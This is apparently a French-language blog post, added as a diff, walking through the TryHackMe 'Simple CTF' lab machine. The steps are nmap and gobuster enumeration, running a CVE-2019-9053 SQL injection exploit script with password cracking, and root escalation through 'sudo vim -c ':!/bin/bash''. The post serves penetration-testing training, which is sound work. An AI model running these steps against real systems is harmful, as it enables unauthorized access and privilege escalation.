@@ -1,0 +1,93 @@
+---
+title: "TryHackMe: Simple CTF — Walkthrough"
+slug: thm-simple-ctf
+date: 2026-02-15
+lang: fr
+type: writeup
+category: Web
+difficulty: Easy
+tags:
+  - tryhackme
+  - web
+  - sqli
+  - privesc
+platform: TryHackMe
+excerpt: "Walkthrough de la machine Simple CTF sur TryHackMe. Exploitation d'une injection SQL et escalade de privilèges via sudo."
+published: true
+---
+
+import { Callout } from "@/components/mdx/Callout";
+import { Terminal } from "@/components/mdx/Terminal";
+import { Flag } from "@/components/mdx/Flag";
+import { Difficulty } from "@/components/mdx/Difficulty";
+
+<Difficulty level="Easy" />
+
+Simple CTF est une machine d'introduction sur TryHackMe, parfaite pour débuter avec les concepts de base du pentesting web.
+
+## Reconnaissance
+
+On commence par un scan nmap pour identifier les services exposés.
+
+<Terminal>
+nmap -sC -sV -oN nmap/initial 10.10.x.x
+</Terminal>
+
+Résultats intéressants :
+- Port 21 : FTP (vsftpd 3.0.3)
+- Port 80 : HTTP (Apache)
+- Port 2222 : SSH
+
+## Énumération Web
+
+On lance gobuster pour découvrir les répertoires cachés.
+
+<Terminal>
+gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
+</Terminal>
+
+On découvre `/simple` qui héberge un CMS Made Simple.
+
+<Callout type="info">
+CMS Made Simple est connu pour avoir plusieurs vulnérabilités, notamment des injections SQL dans certaines versions.
+</Callout>
+
+## Exploitation
+
+Après recherche, on identifie la CVE-2019-9053 permettant une injection SQL basée sur le temps.
+
+<Terminal>
+python exploit.py -u http://10.10.x.x/simple --crack -w /usr/share/wordlists/rockyou.txt
+</Terminal>
+
+On récupère les credentials et on se connecte en SSH.
+
+## Escalade de privilèges
+
+Une fois connecté, on vérifie les permissions sudo.
+
+<Terminal>
+sudo -l
+</Terminal>
+
+L'utilisateur peut exécuter vim en tant que root. On exploite cette misconfiguration.
+
+<Terminal>
+sudo vim -c ':!/bin/bash'
+</Terminal>
+
+<Callout type="success">
+Root obtenu ! La machine est compromise.
+</Callout>
+
+<Flag value="thm{REDACTED}" />
+
+## Conclusion
+
+Cette machine couvre les bases essentielles :
+- Énumération de services
+- Recherche de vulnérabilités connues
+- Exploitation de CVE
+- Privesc via sudo misconfiguration
+
+Machine recommandée pour les débutants souhaitant pratiquer une méthodologie complète.
